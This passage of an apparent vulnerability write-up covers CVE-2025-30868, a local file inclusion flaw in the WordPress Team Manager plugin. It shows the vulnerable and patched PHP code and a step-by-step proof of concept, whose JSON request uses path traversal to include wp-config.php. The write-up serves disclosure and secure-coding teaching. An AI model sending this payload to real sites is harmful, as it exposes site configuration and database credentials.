&lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Vulnerable code&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function renderElementorLayout(string $layout, array $data, array $settings): void&#xA;{&#xA;    $styleTypeKey = &amp;#34;{$layout}_style_type&amp;#34;;&#xA;    $styleType = stripslashes($settings[$styleTypeKey]);&#xA;    $path = stripslashes(TM_PATH . &amp;#39;/public/templates/elementor/layouts/&amp;#39; . $layout . &amp;#39;/&amp;#39;);&#xA;    $templateName = sanitize_file_name( $styleType . &amp;#39;.php&amp;#39; );&#xA;    //allowed file type&#xA;    $allowedFileTypes = [&#xA;        &amp;#39;php&amp;#39;&#xA;    ];&#xA;    $ext = pathinfo($path . $templateName, PATHINFO_EXTENSION);&#xA;    if (in_array($ext, $allowedFileTypes)) {&#xA;        if (file_exists($path . $templateName)) {&#xA;            include self::locateTemplate($templateName, &amp;#39;&amp;#39;, $path);&#xA;        }&#xA;    }&#xA;&#xA;}&#xA;&#xA;private static function locateTemplate(string $templateName, string $templatePath = &amp;#39;&amp;#39;, string $defaultPath = &amp;#39;&amp;#39;): string&#xA;{&#xA;    $templatePath = $templatePath ?: &amp;#39;public/templates&amp;#39;;&#xA;    $defaultPath = $defaultPath ?: TM_PATH . &amp;#39;/public/templates/&amp;#39;;&#xA;    $template = locate_template(trailingslashit($templatePath) . $templateName);&#xA;    return $template ?: &amp;#34;{$defaultPath}{$templateName}&amp;#34;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the vulnerable version, &lt;code&gt;renderElementorLayout()&lt;/code&gt; does not validate input values. An attacker can bypass the logic if they control &lt;code&gt;$layout&lt;/code&gt; and &lt;code&gt;$settings&lt;/code&gt;, for example:&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;In &lt;code&gt;renderElementorLayout()&lt;/code&gt;&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$layout = &amp;quot;../../../../../../..&amp;quot;&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$settings[&#39;../../../../../../.._style_type&#39;] = &amp;quot;wp-config&amp;quot;&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Then:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$styleType = &#39;wp-config&#39;&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$path = TM_PATH . &#39;/public/templates/elementor/layouts/../../../../../../../&#39;&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$templateName = wp-config.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$path . $templateName = TM_PATH . &#39;/public/templates/elementor/layouts/../../../../../../../wp-config.php&#39;&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-15-cve-2025-30868/debug1.png&#34;&#xA;    alt=&#34;Debugger values of variables&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debugger values of variables&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;After passing the &lt;code&gt;if&lt;/code&gt; checks, the code includes the return value of &lt;code&gt;locateTemplate(wp-config.php, &#39;&#39;, TM_PATH . &#39;/public/templates/elementor/layouts/../../../../../../../&#39;)&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private static function locateTemplate(string $templateName, string $templatePath = &amp;#39;&amp;#39;, string $defaultPath = &amp;#39;&amp;#39;): string&#xA;{&#xA;    $templatePath = $templatePath ?: &amp;#39;public/templates&amp;#39;;&#xA;    $defaultPath = $defaultPath ?: TM_PATH . &amp;#39;/public/templates/&amp;#39;;&#xA;    $template = locate_template(trailingslashit($templatePath) . $templateName);&#xA;    return $template ?: &amp;#34;{$defaultPath}{$templateName}&amp;#34;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;At this point:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$templatePath = public/templates&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$defaultPath = TM_PATH . &#39;/public/templates/elementor/layouts/../../../../../../../&#39;&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$locate_template = locate_template(&#39;public/templates/wp-config.php&#39;) = &amp;quot;&amp;quot;&lt;/code&gt; — &lt;a href=&#34;https://developer.wordpress.org/reference/functions/locate_template/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;locate_template()&lt;/a&gt; returns the absolute path if found, otherwise returns an empty string &lt;code&gt;&amp;quot;&amp;quot;&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;When &lt;code&gt;$locate_template&lt;/code&gt; is empty, it returns &lt;code&gt;TM_PATH . &#39;/public/templates/elementor/layouts/../../../../../../../wp-config.php&#39;&lt;/code&gt; to &lt;code&gt;include&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patched code&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function renderElementorLayout(string $layout, array $data, array $settings): void&#xA;{&#xA;    $allowedLayouts = [&amp;#39;grid&amp;#39;, &amp;#39;list&amp;#39;, &amp;#39;slider&amp;#39;, &amp;#39;table&amp;#39;, &amp;#39;isotope&amp;#39;]; // Allowed layouts&#xA;&#xA;    if (!in_array($layout, $allowedLayouts, true)) {&#xA;        wp_die(__(&amp;#39;Invalid layout.&amp;#39;, &amp;#39;wp-team-manager&amp;#39;));&#xA;    }&#xA;&#xA;    $styleTypeKey = &amp;#34;{$layout}_style_type&amp;#34;;&#xA;    $styleType = $settings[$styleTypeKey] ?? &amp;#39;&amp;#39;;&#xA;&#xA;    // Ensure only safe characters (alphanumeric &amp;#43; underscores)&#xA;    if (!preg_match(&amp;#39;/^[a-zA-Z0-9_-]&amp;#43;$/&amp;#39;, $styleType)) {&#xA;        wp_die(__(&amp;#39;Invalid style type.&amp;#39;, &amp;#39;wp-team-manager&amp;#39;));&#xA;    }&#xA;&#xA;    // Ensure constants exist before using them&#xA;    if (!defined(&amp;#39;TM_PATH&amp;#39;)) {&#xA;        wp_die(__(&amp;#39;TM_PATH is not defined.&amp;#39;, &amp;#39;wp-team-manager&amp;#39;));&#xA;    }&#xA;&#xA;    // Define Free path (always available)&#xA;    $basePath = realpath(TM_PATH . &amp;#39;/public/templates/elementor/layouts/&amp;#39;);&#xA;&#xA;    // Define Pro path if available&#xA;    $proPath = defined(&amp;#39;TM_PRO_PATH&amp;#39;) ? realpath(TM_PRO_PATH . &amp;#39;/public/templates/elementor/layouts/&amp;#39;) : null;&#xA;&#xA;    // Ensure the free path is valid&#xA;    if (!$basePath) {&#xA;        wp_die(__(&amp;#39;Invalid base template path.&amp;#39;, &amp;#39;wp-team-manager&amp;#39;));&#xA;    }&#xA;&#xA;    $templateName = sanitize_file_name($styleType . &amp;#39;.php&amp;#39;);&#xA;&#xA;    // Define possible template paths (Pro first, then Free)&#xA;    $proFullPath = $proPath ? $proPath . &amp;#39;/&amp;#39; . $layout . &amp;#39;/&amp;#39; . $templateName : null;&#xA;    $freeFullPath = $basePath . &amp;#39;/&amp;#39; . $layout . &amp;#39;/&amp;#39; . $templateName;&#xA;&#xA;    // Check if Pro template exists and is readable&#xA;    if ($proFullPath &amp;amp;&amp;amp; is_readable($proFullPath) &amp;amp;&amp;amp; strpos(realpath($proFullPath), $proPath) === 0) {&#xA;        include $proFullPath;&#xA;        return;&#xA;    }&#xA;&#xA;    // Check if Free template exists and is readable&#xA;    if (is_readable($freeFullPath) &amp;amp;&amp;amp; strpos(realpath($freeFullPath), $basePath) === 0) {&#xA;        include $freeFullPath;&#xA;        return;&#xA;    }&#xA;&#xA;    // If neither file is found, show an error&#xA;    wp_die(__(&amp;#39;Template not found or invalid file.&amp;#39;, &amp;#39;wp-team-manager&amp;#39;));&#xA;}&#xA;&#xA;private static function locateTemplate(string $templateName, string $templatePath = &amp;#39;&amp;#39;, string $defaultPath = &amp;#39;&amp;#39;): string&#xA;{&#xA;    // Ensure template name is safe (allow only alphanumeric, dashes, and underscores)&#xA;    if (!preg_match(&amp;#39;/^[a-zA-Z0-9_-]&amp;#43;\.php$/&amp;#39;, $templateName)) {&#xA;        die(&amp;#39;Invalid template name.&amp;#39;);&#xA;    }&#xA;&#xA;    $templatePath = $templatePath ?: &amp;#39;public/templates&amp;#39;;&#xA;    $defaultPath = $defaultPath ?: TM_PATH . &amp;#39;/public/templates/&amp;#39;;&#xA;&#xA;    // Ensure paths are properly resolved&#xA;    $resolvedDefaultPath = realpath($defaultPath);&#xA;    $resolvedTemplatePath = realpath(trailingslashit($templatePath));&#xA;&#xA;    // Validate resolved paths&#xA;    if (!$resolvedDefaultPath || strpos($resolvedDefaultPath, realpath(TM_PATH . &amp;#39;/public/templates/&amp;#39;)) !== 0) {&#xA;        die(&amp;#39;Invalid default path.&amp;#39;);&#xA;    }&#xA;&#xA;    if ($resolvedTemplatePath &amp;amp;&amp;amp; strpos($resolvedTemplatePath, realpath(TM_PATH . &amp;#39;/public/templates/&amp;#39;)) === 0) {&#xA;        $template = locate_template($resolvedTemplatePath . &amp;#39;/&amp;#39; . $templateName);&#xA;        if ($template &amp;amp;&amp;amp; file_exists($template)) {&#xA;            return $template;&#xA;        }&#xA;    }&#xA;&#xA;    // Build the final safe path&#xA;    $finalPath = $resolvedDefaultPath . &amp;#39;/&amp;#39; . $templateName;&#xA;&#xA;    // Ensure the final path is within the allowed directory&#xA;    if (file_exists($finalPath) &amp;amp;&amp;amp; strpos(realpath($finalPath), $resolvedDefaultPath) === 0) {&#xA;        return $finalPath;&#xA;    }&#xA;&#xA;    die(&amp;#39;Template not found or invalid.&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch applies strict input validation, absolute path checks, and limits allowed layouts, effectively removing the ability to include files outside the permitted scope — mitigating &lt;strong&gt;Local File Inclusion (LFI)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Info&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;The word &lt;strong&gt;Elementor&lt;/strong&gt; in the function name &lt;code&gt;renderElementorLayout()&lt;/code&gt; refers to the &lt;a href=&#34;https://wordpress.org/plugins/elementor/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Elementor plugin&lt;/strong&gt;&lt;/a&gt; in WordPress, used to build post content.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;When editing a post that contains this &lt;strong&gt;Team Manager widget&lt;/strong&gt; or when opening a saved post, &lt;code&gt;renderElementorLayout()&lt;/code&gt; will be invoked.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-15-cve-2025-30868/plugin_element.png&#34;&#xA;    alt=&#34;Plugin element in Elementor&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Plugin element in Elementor&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Capture the edit request with BurpSuite:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-15-cve-2025-30868/setting.png&#34;&#xA;    alt=&#34;Key settings in the request&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Key settings in the request&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;We observe a &lt;code&gt;settings&lt;/code&gt; key containing &lt;code&gt;layout_type&lt;/code&gt; and &lt;code&gt;{layout_type_value}_style_type&lt;/code&gt; keys corresponding to the analyzed code:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$styleTypeKey = &amp;#34;{$layout}_style_type&amp;#34;;&#xA;$styleType = stripslashes($settings[$styleTypeKey]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 These values are controllable.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-1&#34;&gt;&lt;span&gt;Step 1&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-1&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Create a new team at endpoint: &lt;code&gt;wp-admin/post-new.php?post_type=team_manager&lt;/code&gt; because a new team provides values to add to the Team Manager widget layout.&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-2&#34;&gt;&lt;span&gt;Step 2&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-2&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Create a post using &lt;strong&gt;Elementor&lt;/strong&gt; and add the &lt;strong&gt;Team Manager widget&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-15-cve-2025-30868/widgets.png&#34;&#xA;    alt=&#34;Add the Team Manager widget to a post&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Add the Team Manager widget to a post&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-3&#34;&gt;&lt;span&gt;Step 3&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-3&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;Submit&lt;/strong&gt;, capture the request with &lt;strong&gt;BurpSuite&lt;/strong&gt; and send it to &lt;strong&gt;Repeater&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-4&#34;&gt;&lt;span&gt;Step 4&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-4&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Modify the &lt;code&gt;action&lt;/code&gt; parameter&amp;rsquo;s value in the request using the Inspector and resend the payload&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;save_builder&amp;#34;: {&#xA;    &amp;#34;action&amp;#34;: &amp;#34;save_builder&amp;#34;,&#xA;    &amp;#34;data&amp;#34;: {&#xA;      &amp;#34;status&amp;#34;: &amp;#34;pending&amp;#34;,&#xA;      &amp;#34;elements&amp;#34;: [&#xA;        {&#xA;          &amp;#34;id&amp;#34;: &amp;#34;e9249f1&amp;#34;,&#xA;          &amp;#34;elType&amp;#34;: &amp;#34;container&amp;#34;,&#xA;          &amp;#34;isInner&amp;#34;: false,&#xA;          &amp;#34;isLocked&amp;#34;: false,&#xA;          &amp;#34;settings&amp;#34;: {},&#xA;          &amp;#34;elements&amp;#34;: [&#xA;            {&#xA;              &amp;#34;id&amp;#34;: &amp;#34;3e7c95b&amp;#34;,&#xA;              &amp;#34;elType&amp;#34;: &amp;#34;widget&amp;#34;,&#xA;              &amp;#34;isInner&amp;#34;: false,&#xA;              &amp;#34;isLocked&amp;#34;: false,&#xA;              &amp;#34;settings&amp;#34;: {&#xA;                &amp;#34;layout_type&amp;#34;: &amp;#34;../../../../../../..&amp;#34;,&#xA;                &amp;#34;../../../../../../.._style_type&amp;#34;: &amp;#34;wp-config&amp;#34;&#xA;              },&#xA;              &amp;#34;elements&amp;#34;: [],&#xA;              &amp;#34;widgetType&amp;#34;: &amp;#34;wtm-team-manager&amp;#34;&#xA;            }&#xA;          ]&#xA;        },&#xA;        {&#xA;          &amp;#34;id&amp;#34;: &amp;#34;b132b28&amp;#34;,&#xA;          &amp;#34;elType&amp;#34;: &amp;#34;container&amp;#34;,&#xA;          &amp;#34;isInner&amp;#34;: false,&#xA;          &amp;#34;isLocked&amp;#34;: false,&#xA;          &amp;#34;settings&amp;#34;: {},&#xA;          &amp;#34;elements&amp;#34;: []&#xA;        }&#xA;      ],&#xA;      &amp;#34;settings&amp;#34;: {&#xA;        &amp;#34;post_title&amp;#34;: &amp;#34;Team&amp;#34;,&#xA;        &amp;#34;post_status&amp;#34;: &amp;#34;pending&amp;#34;&#xA;      }&#xA;    }&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;The debugger jumped to &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-15-cve-2025-30868/result.png&#34;&#xA;    alt=&#34;Successful LFI result&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Successful LFI result&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-30868 is an LFI in Team Manager ≤2.1.23: &lt;code&gt;renderElementorLayout()&lt;/code&gt; fails to validate &lt;code&gt;$layout&lt;/code&gt;/&lt;code&gt;$settings&lt;/code&gt;, allowing path traversal and &lt;code&gt;include()&lt;/code&gt; of arbitrary files. Patched in &lt;strong&gt;v2.2.0&lt;/strong&gt; using whitelist, regex checks, and &lt;code&gt;realpath()&lt;/code&gt; verification.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Do not use raw input to build &lt;code&gt;include&lt;/code&gt; 